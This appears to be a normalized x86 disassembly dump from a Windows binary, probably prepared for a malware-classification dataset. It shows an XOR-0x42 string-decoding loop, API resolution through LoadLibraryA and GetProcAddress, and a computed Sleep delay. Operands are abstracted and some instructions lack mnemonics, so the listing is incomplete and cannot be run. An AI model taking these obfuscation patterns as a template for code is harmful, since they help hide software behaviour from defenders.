mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_4032f0
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
add eax 0xfffffffe
push eax
call sub_406b10
add esp 0x4
cmp cl 0xff
je r-xdata
add eax 0xfffffffe
push eax
call sub_406b10
add esp 0x4
cmp cl 0xff
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
dec cl
push edi
mov [ eax - 0x1 ] cl
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_4032f0
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
sub_4032f0
push ebp
mov ebp esp
push 0xffffffff
push sub_40df40
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi eax
mov esi ecx
or edi 0x1f
mov [ ebp - 0x10 ] esp
cmp edi 0x7ffffffd
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ edi + 0x2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jge r-xdata
mov edi eax
add eax eax
push eax
call sub_4075a5
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov edx [ esi + 0x8 ]
test edx edx
jbe r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx edi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x8 ] 0x0
cmp ebx edi
lea eax [ ecx + 0x2 ]
mov [ esi + 0x4 ] eax
mov [ eax - 0x1 ] 0x0
mov [ esi + 0xc ] edi
ja r-xdata
mov cl [ eax - 0x1 ]
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add eax 0x2
test edx edx
jbe r-xdata
mov edx edi
mov edx [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x8 ] edi
mov [ edx + edi * 2 ] 0x0
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi ebx
add eax 0xfffffffe
push eax
call sub_406b10
add esp 0x4
cmp cl 0xff
je r-xdata
mov bx [ ecx ]
add ecx 0x2
mov [ eax ] bx
add eax 0x2
dec edx
jne r-xdata
dec cl
mov [ eax - 0x1 ] cl
jmp r-xdata
sub_403348
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
add eax 0x2
test eax eax
jge r-xdata
lea ecx [ eax + eax ]
push ecx
call sub_4075a5
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
xor eax eax
sub_403480
push 0xffffffff
push sub_40e016
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1e4
push ebx
push ebp
mov ebp ecx
push esi
xor ebx ebx
push edi
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x38 ] ebx
call sub_401000
mov al [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x98 ]
mov [ esp + 0x200 ] ebx
mov [ esp + 0x98 ] al
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x9c ]
call sub_402c00
mov cl [ esp + 0x13 ]
push ebx
mov [ esp + 0x60 ] cl
lea ecx [ esp + 0x60 ]
mov [ esp + 0x200 ] 0x1
call sub_402ca0
mov dl [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x200 ] 0x2
mov [ esp + 0x50 ] dl
call sub_402ca0
mov al [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x80 ]
mov [ esp + 0x200 ] 0x3
mov [ esp + 0x80 ] al
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x1fc ] 0x4
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x64 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x54 ]
call sub_402c00
mov cl [ esp + 0x4c ]
sub esp 0x10
mov esi esp
mov [ esp + 0xa0 ] esp
push ebx
mov [ esi ] cl
mov ecx esi
call sub_402ca0
mov edx [ r--data ]
lea eax [ esp + 0x5c ]
push edx
push ebx
push eax
mov ecx esi
call sub_402a00
sub esp 0x10
lea edx [ esp + 0x7c ]
mov ecx esp
mov [ esp + 0xac ] esp
push edx
mov [ esp + 0x220 ] 0x5
call sub_405a60
sub esp 0x10
lea eax [ esp + 0xc4 ]
mov ecx esp
mov [ esp + 0x54 ] esp
push eax
mov [ esp + 0x230 ] 0x6
call sub_405a60
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x22c ] 0x4
push ecx
mov ecx ebp
call sub_4056c0
mov edx [ r--data ]
lea ecx [ esp + 0x7c ]
push edx
push ebx
push eax
mov [ esp + 0x208 ] 0x7
call sub_402a00
push 0x1
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x200 ] 0x4
call sub_402ca0
lea eax [ esp + 0x7c ]
lea ecx [ esp + 0xe8 ]
push eax
call sub_402840
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push rw-data
lea ecx [ esp + 0x20 ]
call sub_405d70
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x2c ]
push ebx
mov esi eax
lea ecx [ esp + 0xb8 ]
mov al [ eax ]
mov [ esp + 0xb8 ] al
call sub_402ca0
mov ecx [ r--data ]
push ecx
push ebx
push esi
lea ecx [ esp + 0xc0 ]
call sub_402a00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0xbc ]
[ edi ]
not ecx
dec ecx
mov [ esp + 0x1fc ] 0xf
push ecx
push rw-data
push edx
push ebx
lea ecx [ esp + 0xc4 ]
call sub_406910
cmp eax ebx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push rw-data
lea ecx [ esp + 0x20 ]
call sub_405d70
cmp eax 0xffffffff
je r-xdata
mov dl [ esp + 0x14 ]
sub esp 0x10
mov esi esp
mov [ esp + 0x34 ] esp
push ebx
mov ecx esi
mov [ esi ] dl
call sub_402ca0
mov eax [ r--data ]
lea ecx [ esp + 0x24 ]
push eax
push ebx
push ecx
mov ecx esi
call sub_402a00
lea edx [ esp + 0xe8 ]
mov ecx ebp
push edx
call sub_404840
mov ecx [ r--data ]
mov [ esp + 0x1fc ] 0x11
push ecx
push ebx
push eax
lea ecx [ esp + 0x48 ]
call sub_402a00
push 0x1
lea ecx [ esp + 0xdc ]
mov [ esp + 0x200 ] 0xc
call sub_402ca0
push 0x1
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x200 ] 0xc
call sub_402ca0
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax ebx
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push rw-data
lea ecx [ esp + 0x20 ]
call sub_405d70
cmp eax 0xffffffff
je r-xdata
push ebx
lea edx [ esp + 0x70 ]
sub esp 0x10
mov ecx esp
mov [ esp + 0x38 ] esp
push edx
call sub_405a60
mov ecx ebp
call sub_403d70
lea edx [ esp + 0xc4 ]
push edx
push ecx
push eax
lea eax [ esp + 0xd4 ]
push eax
mov ecx ebp
call sub_405140
mov ecx [ r--data ]
mov [ esp + 0x1fc ] 0x10
push ecx
push ebx
push eax
lea ecx [ esp + 0x20 ]
call sub_402a00
push 0x1
lea ecx [ esp + 0xcc ]
mov [ esp + 0x200 ] 0xf
call sub_402ca0
mov eax [ esp + 0x1c ]
xor esi esi
cmp eax ebx
jbe r-xdata
mov eax r--data
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push rw-data
lea ecx [ esp + 0x20 ]
call sub_405d70
cmp eax 0xffffffff
je r-xdata
push 0x1
lea eax [ esp + 0x70 ]
sub esp 0x10
mov ecx esp
mov [ esp + 0x38 ] esp
push eax
call sub_405a60
mov ecx ebp
call sub_403d70
cmp eax esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x44 ]
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
push ebx
lea ecx [ esp + 0x4c ]
call sub_406910
cmp eax ebx
je r-xdata
mov cl [ esp + 0x14 ]
sub esp 0x10
mov esi esp
mov [ esp + 0x34 ] esp
push ebx
mov [ esi ] cl
mov ecx esi
call sub_402ca0
mov edx [ r--data ]
lea eax [ esp + 0x24 ]
push edx
push ebx
push eax
mov ecx esi
call sub_402a00
mov ecx ebp
call sub_404b20
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x5
push ecx
call [ Sleep@IAT ]
mov edi r--data
cmp ecx ebx
je r-xdata
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x2c ]
cmp esi edi
mov [ esp + 0x1fc ] 0xb
je r-xdata
cmp [ esp + 0x38 ] 0x3
jge r-xdata
mov eax r--data
cmp ecx ebx
je r-xdata
lea ecx [ esp + 0x14 ]
call sub_405e80
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
lea edi [ ecx + esi ]
jmp r-xdata
push esi
call sub_406b10
mov eax [ esp + 0x1c ]
add esp 0x4
cmp eax ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
je r-xdata
push 0x1
mov ecx esi
call sub_402ca0
add esi 0x10
cmp esi edi
jne r-xdata
lea eax [ esp + 0x3c ]
lea ecx [ esp + 0xe8 ]
push eax
call sub_402840
mov ecx [ esp + 0x38 ]
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x2c ]
inc ecx
cmp esi edi
mov [ esp + 0x38 ] ecx
mov [ esp + 0x1fc ] 0xb
je r-xdata
mov ecx [ esp + 0x18 ]
jb r-xdata
lea ecx [ esp + 0x14 ]
call sub_405e80
mov edx [ esp + 0x18 ]
lea eax [ edx + esi ]
jmp r-xdata
cmp eax esi
jb r-xdata
mov eax [ esp + 0x40 ]
mov [ esp + 0x18 ] ebx
cmp eax ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov esi [ esp + 0x2c ]
push esi
call sub_406b10
add esp 0x4
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
push 0x1
mov [ esp + 0x38 ] ebx
mov [ esp + 0x200 ] 0xa
call sub_402ca0
push 0x1
lea ecx [ esp + 0x40 ]
mov [ esp + 0x200 ] 0x9
call sub_402ca0
push 0x1
lea ecx [ esp + 0x70 ]
mov [ esp + 0x200 ] 0x4
call sub_402ca0
jmp r-xdata
push ebx
mov ecx esi
call sub_406850
add esi 0x10
cmp esi edi
jne r-xdata
mov cl [ edi ]
xor cl 0x42
inc esi
mov [ eax ] cl
mov eax [ esp + 0x1c ]
cmp eax esi
ja r-xdata
mov eax [ esp + 0x70 ]
mov [ esp + 0x40 ] ebx
cmp eax ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov cl [ esp + 0x13 ]
push ebx
mov [ esp + 0xa8 ] cl
lea ecx [ esp + 0xa8 ]
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0xac ]
call sub_402c00
lea edx [ esp + 0xa4 ]
push ebx
push edx
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x204 ] 0x8
call sub_4018f0
push 0x1
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x200 ] 0x4
call sub_402ca0
lea eax [ esp + 0x6c ]
lea ecx [ esp + 0xe8 ]
push eax
call sub_402710
mov cl [ esp + 0x13 ]
push ebx
mov [ esp + 0x40 ] cl
lea ecx [ esp + 0x40 ]
mov [ esp + 0x200 ] 0x9
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x44 ]
call sub_402c00
mov dl [ esp + 0x13 ]
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x200 ] 0xa
mov [ esp + 0x18 ] dl
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x1c ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x1fc ] 0xb
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x64 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x54 ]
call sub_402c00
mov al [ esp + 0x13 ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x28 ] al
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x4c ]
push ecx
mov [ esp + 0x200 ] 0xc
sub esp 0x10
mov ecx esp
mov [ esp + 0x38 ] esp
push edx
call sub_405a60
sub esp 0x10
lea eax [ esp + 0x80 ]
mov ecx esp
mov [ esp + 0xb0 ] esp
push eax
mov [ esp + 0x224 ] 0xd
call sub_405a60
sub esp 0x10
lea edx [ esp + 0xa0 ]
mov ecx esp
mov [ esp + 0xc4 ] esp
push edx
mov [ esp + 0x234 ] 0xe
call sub_405a60
mov ecx ebp
mov [ esp + 0x230 ] 0xc
call sub_404d60
cmp eax ebx
jle r-xdata
mov esi [ esp + 0x2c ]
mov eax [ esp + 0x80 ]
mov [ esp + 0x70 ] ebx
cmp eax ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov eax [ esp + 0x50 ]
mov [ esp + 0x80 ] ebx
cmp eax ebx
mov [ esp + 0x84 ] ebx
mov [ esp + 0x88 ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov eax [ esp + 0x60 ]
mov [ esp + 0x50 ] ebx
cmp eax ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov eax [ esp + 0x98 ]
mov [ esp + 0x60 ] ebx
cmp eax ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x98 ] ebx
mov [ esp + 0x9c ] ebx
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x1fc ] 0xffffffff
call sub_401500
mov ecx [ esp + 0x1f4 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1f0
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_403d70
push ebp
mov ebp esp
push 0xffffffff
push sub_40e0fa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x208
push ebx
mov ebx ecx
push esi
push edi
mov [ ebp - 0x20 ] ebx
xor esi esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
mov al [ ebp + 0x1b ]
push esi
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x88 ] al
call sub_402ca0
mov cl [ ebp + 0x1b ]
push esi
mov [ ebp - 0x98 ] cl
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x1
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ ebp - 0x4 ] 0x2
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0x88 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0x98 ]
call sub_402c00
mov dl [ ebp + 0x1b ]
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x50 ] dl
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x44 ] esi
lea eax [ ebp - 0x50 ]
lea edx [ ebp - 0x98 ]
push eax
mov [ ebp - 0x4 ] 0x3
sub esp 0x10
mov ecx esp
mov [ ebp - 0x64 ] esp
push edx
call sub_405a60
sub esp 0x10
lea eax [ ebp - 0x88 ]
mov ecx esp
mov [ ebp - 0x68 ] esp
push eax
mov [ ebp - 0x4 ] 0x4
call sub_405a60
sub esp 0x10
lea edx [ ebp + 0x8 ]
mov ecx esp
mov [ ebp - 0xac ] esp
push edx
mov [ ebp - 0x4 ] 0x5
call sub_405a60
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_404d60
mov esi eax
mov al [ ebp + 0x1b ]
mov [ ebp - 0x1c ] al
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0x1c ]
call sub_402c00
test esi esi
mov [ ebp - 0x4 ] 0x6
jle r-xdata
push rw-data
lea ecx [ ebp - 0x1c ]
call sub_4068b0
test eax eax
jne r-xdata
mov ecx [ r--data ]
mov edx [ ebp - 0x4c ]
push ecx
push 0x0
push edx
lea ecx [ ebp - 0x1c ]
call sub_402a00
mov eax [ ebp - 0x18 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x78 ]
mov ecx ebx
push eax
call sub_404f60
push rw-data
lea ecx [ ebp - 0x60 ]
mov bl 0x7
push eax
push ecx
mov [ ebp - 0x4 ] bl
call sub_406330
add esp 0xc
mov edx [ r--data ]
lea ecx [ ebp - 0x1c ]
push edx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x8
call sub_402a00
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] bl
call sub_402ca0
mov [ ebp - 0x4 ] 0x6
push 0x1
lea ecx [ ebp - 0x78 ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0xac ]
push ecx
push edx
push eax
lea eax [ ebp - 0x60 ]
push eax
mov ecx ebx
call sub_405140
mov ecx [ r--data ]
mov [ ebp - 0x4 ] 0x9
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x1c ]
call sub_402a00
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x6
call sub_402ca0
mov eax [ ebp - 0x14 ]
xor esi esi
test eax eax
jbe r-xdata
mov eax r--data
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0x88 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0x98 ]
call sub_402c00
mov dl [ ebp + 0x1b ]
xor esi esi
mov [ ebp - 0x40 ] dl
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] esi
lea eax [ ebp - 0x40 ]
lea edx [ ebp - 0x98 ]
push eax
mov [ ebp - 0x4 ] 0xc
sub esp 0x10
mov ecx esp
mov [ ebp - 0xac ] esp
push edx
call sub_405a60
sub esp 0x10
lea eax [ ebp - 0x88 ]
mov ecx esp
mov [ ebp - 0x64 ] esp
push eax
mov [ ebp - 0x4 ] 0xd
call sub_405a60
sub esp 0x10
lea edx [ ebp + 0x8 ]
mov ecx esp
mov [ ebp - 0x68 ] esp
push edx
mov [ ebp - 0x4 ] 0xe
call sub_405a60
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xc
call sub_404d60
mov ebx eax
cmp ebx esi
jle r-xdata
lea edx [ ebp - 0x78 ]
mov ecx ebx
push edx
call sub_404f60
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x60 ]
push ecx
mov bl 0xa
push eax
push edx
mov [ ebp - 0x4 ] bl
call sub_406460
add esp 0xc
mov ecx [ r--data ]
mov [ ebp - 0x4 ] 0xb
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x1c ]
call sub_402a00
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] bl
call sub_402ca0
mov [ ebp - 0x4 ] 0x6
push 0x1
lea ecx [ ebp - 0x78 ]
cmp eax esi
jmp r-xdata
mov al [ ebp + 0x1b ]
push esi
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0xa8 ] al
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0xa8 ]
call sub_402c00
test ebx ebx
mov [ ebp - 0x4 ] 0xf
jle r-xdata
mov edi r--data
test ecx ecx
je r-xdata
mov edi [ ebp - 0x38 ]
mov esi [ ebp - 0x3c ]
cmp esi edi
mov [ ebp - 0x4 ] 0x6
je r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
jne r-xdata
mov eax esi
and eax 0x80000001
jns r-xdata
mov eax r--data
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x1c ]
call sub_405e80
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
lea edi [ ecx + esi ]
jmp r-xdata
push esi
call sub_406b10
mov eax [ ebp - 0x18 ]
xor ebx ebx
add esp 0x4
cmp eax ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
je r-xdata
push 0x1
mov ecx esi
call sub_402ca0
add esi 0x10
cmp esi edi
jne r-xdata
push 0x0
push eax
call sub_4077f4
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov eax r--data
test esi esi
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov ecx [ ebp - 0x18 ]
jb r-xdata
lea ecx [ ebp - 0x1c ]
call sub_405e80
mov edx [ ebp - 0x18 ]
lea eax [ edx + esi ]
jmp r-xdata
cmp eax esi
jb r-xdata
mov edi [ ebp - 0x48 ]
mov esi [ ebp - 0x4c ]
cmp esi edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x3c ]
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x110 ]
[ edi ]
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x110 ] 0x44
push eax
call [ GetStartupInfoA@IAT ]
xor ebx ebx
push rw-data
mov [ ebp - 0xe0 ] bx
mov [ ebp - 0xe4 ] 0x101
call [ LoadLibraryA@IAT ]
mov cl [ ebp + 0x1b ]
push ebx
mov [ ebp - 0x78 ] cl
lea ecx [ ebp - 0x78 ]
mov esi eax
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ ebp - 0x78 ]
call sub_402c00
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x13
cmp eax ebx
mov [ ebp - 0x64 ] ebx
jne r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x3c ]
lea edx [ ebp - 0xa8 ]
push ecx
lea eax [ ebp - 0x60 ]
push edx
push eax
call sub_406460
add esp 0xc
mov ecx [ r--data ]
mov [ ebp - 0x4 ] 0x10
push ecx
push esi
push eax
lea ecx [ ebp - 0xa8 ]
call sub_402a00
mov [ ebp - 0x4 ] 0xf
push 0x1
lea ecx [ ebp - 0x60 ]
jmp r-xdata
mov cl [ edi ]
xor cl 0x42
inc esi
mov [ eax ] cl
mov eax [ ebp - 0x14 ]
cmp eax esi
ja r-xdata
push esi
call sub_406b10
mov ecx [ ebp - 0x94 ]
add esp 0x4
cmp ecx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
je r-xdata
push 0x1
mov ecx esi
call sub_402ca0
add esi 0x10
cmp esi edi
jne r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ ebp - 0x70 ]
mov edi [ ebp - 0x20 ]
lea edx [ ebp - 0x64 ]
push edx
push ecx
lea edx [ ebp - 0x60 ]
push eax
push edx
mov ecx edi
call sub_405140
mov ecx [ r--data ]
mov [ ebp - 0x4 ] 0x14
push ecx
push ebx
push eax
lea ecx [ ebp - 0x78 ]
call sub_402a00
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x13
call sub_402ca0
mov eax [ ebp - 0x74 ]
cmp eax ebx
jne r-xdata
mov eax r--data
push rw-data
push eax
call sub_4077e1
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov eax r--data
inc esi
cmp esi ebx
jl r-xdata
mov ecx [ ebp - 0x3c ]
mov edx esi
shl edx 0x4
add edx ecx
lea eax [ ebp - 0xa8 ]
push edx
lea ecx [ ebp - 0x30 ]
push eax
push ecx
call sub_406460
add esp 0xc
mov edx [ r--data ]
lea ecx [ ebp - 0xa8 ]
push edx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x11
call sub_402a00
mov [ ebp - 0x4 ] 0xf
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_402ca0
mov ecx [ ebp - 0x84 ]
mov [ ebp - 0x94 ] ebx
cmp ecx ebx
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x8c ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x4c ]
dec al
mov [ ecx ] al
jmp r-xdata
push eax
push esi
call [ GetProcAddress@IAT ]
cmp esi ebx
mov [ edi + 0x4 ] eax
jne r-xdata
mov eax r--data
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor esi esi
[ edi ]
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x68 ] esi
not ecx
dec ecx
push ecx
push rw-data
push eax
push esi
lea ecx [ ebp - 0xa8 ]
call sub_406910
cmp eax esi
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x84 ] ebx
cmp ecx ebx
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x7c ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push 0x1
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xf
call sub_402ca0
push 0x1
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0xc
call sub_402ca0
mov eax [ ebp - 0x38 ]
mov esi [ ebp - 0x3c ]
cmp esi eax
mov [ ebp - 0x4 ] 0x6
mov edi eax
je r-xdata
push ebx
call sub_407661
add esp 0x4
mov eax [ ebp - 0xa4 ]
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x60 ]
push edx
call sub_405950
mov edi [ ebp - 0x5c ]
